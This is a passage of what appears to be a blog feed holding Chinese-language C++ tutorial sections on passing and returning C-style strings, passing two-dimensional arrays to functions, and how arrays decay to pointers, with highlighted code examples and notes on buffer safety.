&lt;&lt; string_length(<span class="string">&quot;C++&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;                 <span class="comment">// 输出: 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例 2: 打印 C-风格字符串</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数：打印 C 风格字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_string</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 可以直接使用 cout，它知道如何处理 char* 直到遇到 &#x27;\0&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; str;</span><br><span class="line">    <span class="comment">// 或者手动遍历</span></span><br><span class="line">    <span class="comment">// while (*str != &#x27;\0&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     std::cout &lt;&lt; *str;</span></span><br><span class="line">    <span class="comment">//     str++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[] = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    print_string(name);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>重要注意事项:</strong></p><ul><li>  <strong>空字符终止:</strong> 处理 C-风格字符串的函数依赖于空字符 <code>\0</code> 来确定结束。如果传递的字符数组没有正确地以 <code>\0</code> 结尾，函数可能会读取超出数组边界的内存，导致未定义行为（通常是程序崩溃或数据损坏）。</li><li>  <strong>缓冲区溢出:</strong> 如果函数需要修改传入的字符串或将数据写入字符数组缓冲区（例如 <code>strcpy</code>, <code>strcat</code> 的自定义版本），必须确保操作不会超出缓冲区的分配大小，否则会发生缓冲区溢出，这是一个严重的安全漏洞。通常需要传递缓冲区的大小作为额外参数。</li><li>  <strong><code>const</code> 正确性:</strong> 明确使用 <code>const char*</code> 来表示函数不会修改输入字符串。</li></ul><h2 id="7-5-2-返回-C-风格字符串的函数"><a href="#7-5-2-返回-C-风格字符串的函数" class="headerlink" title="7.5.2 返回 C-风格字符串的函数"></a>7.5.2 返回 C-风格字符串的函数</h2><p>让函数返回一个 C-风格字符串（即 <code>char*</code>）比传递它要复杂得多，并且充满了潜在的陷阱。主要问题在于字符串数据存储在哪里以及其生命周期。</p><p><strong>常见的错误方式 (危险！):</strong></p><ol><li><strong>返回指向局部变量的指针:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// !!! 错误且危险的示例 !!!</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">create_temp_string</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> temp[] = <span class="string">&quot;Temporary&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> temp; <span class="comment">// 错误！temp 是局部数组，函数返回后内存被释放</span></span><br><span class="line">                 <span class="comment">// 返回的指针将指向无效内存 (悬挂指针)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> 调用 <code>create_temp_string()</code> 后得到的指针是无效的，解引用它会导致未定义行为。</li></ol><p><strong>可行的（但各有缺点）方式:</strong></p><ol><li><p><strong>返回指向静态局部变量的指针:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态局部变量</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">get_static_message</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> message[] = <span class="string">&quot;Static Message&quot;</span>;</span><br><span class="line">    <span class="comment">// message 在程序整个生命周期内存在，但只有一个实例</span></span><br><span class="line">    <span class="keyword">return</span> message;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* msg1 = get_static_message();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Msg1: &quot;</span> &lt;&lt; msg1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Static Message</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果函数被再次调用，它会返回指向 *同一个* 静态内存的指针</span></span><br><span class="line">    <span class="comment">// 如果函数内部修改了静态变量，所有之前的指针都会看到变化</span></span><br><span class="line">    <span class="comment">// 这种方式不是线程安全的</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* msg2 = get_static_message();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Msg2: &quot;</span> &lt;&lt; msg2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Static Message</span></span><br><span class="line">    <span class="comment">// msg1 和 msg2 指向同一块内存</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>缺点:</strong> 返回的指针指向的内存在后续调用中可能被覆盖（如果函数修改静态变量的话），并且这种方法不是线程安全的。</p></li><li><p><strong>返回指向动态分配内存的指针 (<code>new</code>):</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strcpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回动态分配的内存</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">create_dynamic_string</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* initial_value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* dynamic_str = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="built_in">strlen</span>(initial_value) + <span class="number">1</span>]; <span class="comment">// 分配内存 (+1 for &#x27;\0&#x27;)</span></span><br><span class="line">    <span class="built_in">strcpy</span>(dynamic_str, initial_value); <span class="comment">// 复制内容</span></span><br><span class="line">    <span class="keyword">return</span> dynamic_str; <span class="comment">// 返回指向新分配内存的指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* str1 = create_dynamic_string(<span class="string">&quot;Dynamic Data&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic String 1: &quot;</span> &lt;&lt; str1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// !!! 重要：调用者必须负责释放内存 !!!</span></span><br><span class="line">    <span class="keyword">delete</span>[] str1;</span><br><span class="line">    str1 = <span class="literal">nullptr</span>; <span class="comment">// 好习惯：释放后置空指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* str2 = create_dynamic_string(<span class="string">&quot;More Data&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dynamic String 2: &quot;</span> &lt;&lt; str2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">delete</span>[] str2;</span><br><span class="line">    str2 = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>缺点:</strong> 调用者必须记住使用 <code>delete[]</code> 来释放返回的指针所指向的内存，否则会导致内存泄漏。这种责任转移很容易出错。</p></li><li><p><strong>传递由调用者分配的缓冲区 (推荐方式):</strong><br> 这是最安全、最常用的方法。函数接受一个指向调用者提供的缓冲区的指针和该缓冲区的大小，然后将结果字符串写入该缓冲区。</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // 为了 strncpy</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数将结果写入调用者提供的缓冲区</span></span><br><span class="line"><span class="comment">// 返回值可以指示成功/失败或写入的字符数</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">format_greeting</span><span class="params">(<span class="keyword">char</span> buffer[], <span class="keyword">size_t</span> buffer_size, <span class="keyword">const</span> <span class="keyword">char</span>* name)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 snprintf 或其他安全函数来防止缓冲区溢出</span></span><br><span class="line">    <span class="keyword">int</span> written = <span class="built_in">snprintf</span>(buffer, buffer_size, <span class="string">&quot;Hello, %s!&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否成功且未截断 (snprintf 返回值特性)</span></span><br><span class="line">    <span class="keyword">if</span> (written &gt; <span class="number">0</span> &amp;&amp; written &lt; buffer_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 成功</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 可能缓冲区太小或发生错误</span></span><br><span class="line">        <span class="keyword">if</span> (buffer_size &gt; <span class="number">0</span>) buffer[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 确保缓冲区为空字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 失败</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> BUF_SIZE = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">char</span> my_buffer[BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format_greeting(my_buffer, BUF_SIZE, <span class="string">&quot;Alice&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted Greeting: &quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Hello, Alice!</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to format greeting (buffer too small?)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (format_greeting(my_buffer, <span class="number">10</span>, <span class="string">&quot;Bob The Builder&quot;</span>)) &#123; <span class="comment">// 尝试用小缓冲区</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Formatted Greeting: &quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to format greeting (buffer too small?)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这将被打印</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content after fail: \&quot;&quot;</span> &lt;&lt; my_buffer &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: &quot;&quot; (因为函数清空了)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>优点:</strong> 内存管理由调用者负责，函数本身不分配内存，避免了内存泄漏和悬挂指针的风险。函数接口清晰地表明了其对缓冲区的需求。</p></li></ol><p><strong>总结:</strong></p><ul><li>  将 C-风格字符串作为参数传递给函数时，传递的是 <code>char*</code>，函数依赖 <code>\0</code> 确定结束，使用 <code>const char*</code> 防止意外修改。</li><li>  让函数返回 C-风格字符串 (<code>char*</code>) 比较棘手。返回指向局部变量的指针是错误的。返回静态变量指针有局限性。返回动态分配内存 (<code>new</code>) 要求调用者管理内存 (<code>delete[]</code>)。</li><li>  最安全、最推荐的方式是让调用者提供缓冲区，函数将结果写入该缓冲区，并通常传递缓冲区大小以防止溢出。</li><li>  在现代 C++ 中，通常更推荐使用 <code>std::string</code> 类来处理字符串，因为它会自动管理内存，避免了许多与 C-风格字符串相关的陷阱。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.4 函数和二维数组</title>
      <link href="2025/04/26/7.4_%E5%87%BD%E6%95%B0%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/"/>
      <url>2025/04/26/7.4_%E5%87%BD%E6%95%B0%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>将二维数组传递给函数比传递一维数组稍微复杂一些。与一维数组类似，二维数组名在传递时也会“退化”成指向其第一个元素的指针。但二维数组的第一个元素本身是一个<strong>一维数组</strong>。因此，传递的是指向一维数组的指针。</p><p>为了让函数能够正确地计算元素在内存中的位置，编译器需要知道除第一维（行数）之外的所有其他维度的大小（列数，以及更高维度的相应大小）。</p><p><strong>关键点:</strong> 在函数参数中声明二维数组时，<strong>必须</strong>指定除第一维之外的所有维度的大小。第一维的大小是可选的（通常省略）。</p><p><strong>语法:</strong></p><p>假设有一个二维数组 <code>int data[3][4];</code></p><p>函数原型或定义可以这样写：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 语法 1: 指定列数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][<span class="number">4</span>], <span class="keyword">int</span> rows)</span></span>; <span class="comment">// 必须指定列数 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 2: 使用指向数组的指针 (更精确地反映底层机制)</span></span><br><span class="line"><span class="comment">// arr 是一个指针，指向一个包含 4 个 int 的数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_2d_array</span><span class="params">(<span class="keyword">int</span> (*arr)[<span class="number">4</span>], <span class="keyword">int</span> rows)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 3: 可以包含第一维，但通常省略</span></span><br><span class="line"><span class="comment">// void process_2d_array(int arr[3][4], int rows); // 这里的 3 实际上会被忽略</span></span><br></pre></td></tr></table></figure><p><strong>为什么必须指定列数？</strong></p><p>考虑二维数组 <code>arr[rows][cols]</code> 在内存中是线性存储的。要访问元素 <code>arr[i][j]</code>，编译器需要计算其内存地址，公式通常类似于：<code>基地址 + (i * cols + j) * sizeof(元素类型)</code>。可以看到，计算地址需要知道 <code>cols</code>（列数）的值。如果函数不知道列数，就无法正确地进行指针运算来定位元素。</p><p><strong>示例：处理二维数组的函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> COLS = <span class="number">4</span>; <span class="comment">// 使用常量定义列数，方便维护</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：计算二维数组所有元素的和</span></span><br><span class="line"><span class="comment">// 参数：二维数组 (必须指定列数 COLS)，行数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：打印二维数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_2d_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span></span>; <span class="comment">// 使用 const 防止修改</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">3</span>][COLS] = &#123;</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;,</span><br><span class="line">        &#123;<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>&#125;,</span><br><span class="line">        &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> num_rows = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Original 2D Array:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_2d_array(data, num_rows);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> total_sum = sum_2d_array(data, num_rows);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSum of all elements: &quot;</span> &lt;&lt; total_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 78</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：计算二维数组所有元素的和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_2d_array</span><span class="params">(<span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义：打印二维数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_2d_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[][COLS], <span class="keyword">int</span> rows)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; COLS; ++j) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; arr[i][j] &lt;&lt; <span class="string">&quot;\t&quot;</span>; <span class="comment">// 使用制表符分隔</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 每行结束后换行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 我们定义了一个全局常量 <code>COLS</code> 来表示数组的列数。这使得在函数原型和定义中指定列数更加方便和一致。</li><li> <code>sum_2d_array</code> 和 <code>print_2d_array</code> 函数的第一个参数都声明为 <code>int arr[][COLS]</code> 或 <code>const int arr[][COLS]</code>，明确指定了列的大小。</li><li> <code>main</code> 函数中定义了一个 3x4 的二维数组 <code>data</code>。</li><li> 调用函数时，传递数组名 <code>data</code>（它代表指向第一个包含 <code>COLS</code> 个 <code>int</code> 的一维数组的指针）和行数 <code>num_rows</code>。</li><li> 函数内部可以使用标准的 <code>arr[i][j]</code> 语法来访问数组元素，因为编译器知道列数 <code>COLS</code>，可以正确计算每个元素的地址。</li></ol><p><strong>总结:</strong></p><ul><li>  将二维（或更高维）数组传递给函数时，必须在函数参数中指定除第一维之外的所有维度的大小。</li><li>  这是因为函数需要这些维度信息来进行正确的指针运算以访问数组元素。</li><li>  通常将数组维度（尤其是除第一维外的维度）定义为常量，以提高代码的可读性和可维护性。</li><li>  与一维数组一样，函数操作的是原始数组，而不是副本（除非使用了 <code>const</code>，否则函数可以修改原始数组）。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.3 函数和数组</title>
      <link href="2025/04/26/7.3_%E5%87%BD%E6%95%B0%E5%92%8C%E6%95%B0%E7%BB%84/"/>
      <url>2025/04/26/7.3_%E5%87%BD%E6%95%B0%E5%92%8C%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<p>将数组传递给函数是 C++ 中常见的操作，但其工作方式与传递普通变量（如 <code>int</code> 或 <code>double</code>）有显著不同。理解这种差异对于正确使用数组作为函数参数至关重要。</p><p>与基本类型默认使用“按值传递”（创建副本）不同，当将数组传递给函数时，C++ <strong>不会</strong>复制整个数组。相反，它传递的是数组<strong>第一个元素的内存地址</strong>。这意味着函数实际上接收的是一个指向数组起始位置的指针。</p><h2 id="7-3-1-函数如何使用指针来处理数组"><a href="#7-3-1-函数如何使用指针来处理数组" class="headerlink" title="7.3.1 函数如何使用指针来处理数组"></a>7.3.1 函数如何使用指针来处理数组</h2><p>因为函数接收的是数组的地址（指针），所以它可以通过这个地址直接访问和修改原始数组的内容。这与按值传递完全不同，后者操作的是副本。</p><p>在函数定义中，接收数组参数有几种等效的语法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 语法 1: 使用指针表示法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_array</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 2: 使用带空括号的数组表示法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_array</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法 3: 使用带指定大小的数组表示法 (大小会被忽略，不推荐)</span></span><br><span class="line"><span class="comment">// void process_array(int arr[10], int size); // 这里的 10 实际上没有作用</span></span><br></pre></td></tr></table></figure><p>这三种语法在函数参数列表中是等效的，它们都告诉编译器 <code>arr</code> 是一个指向 <code>int</code> 的指针。最常用的是语法 1 和语法 2。</p><p><strong>关键点:</strong> 无论使用哪种语法，函数都不知道数组的实际大小。因此，通常需要将数组的大小作为<strong>单独的参数</strong>传递给函数。</p><p><strong>示例：函数修改数组元素</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型：接收一个 int 指针 (数组) 和大小</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_elements</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123; <span 